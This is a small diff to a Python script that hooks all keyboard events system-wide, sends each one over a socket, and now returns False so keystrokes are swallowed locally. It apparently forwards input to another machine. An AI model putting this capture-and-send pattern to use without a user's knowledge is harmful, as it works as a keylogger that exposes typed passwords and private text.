@@ -47,7 +47,7 @@ def KeyAll(event):
     # print(bin(isup + event.KeyID))
     # print(msg)
     s.send(msg)
-    return True
+    return False
 
 hm.SubscribeKeyAll(KeyAll)
 hm.HookKeyboard()
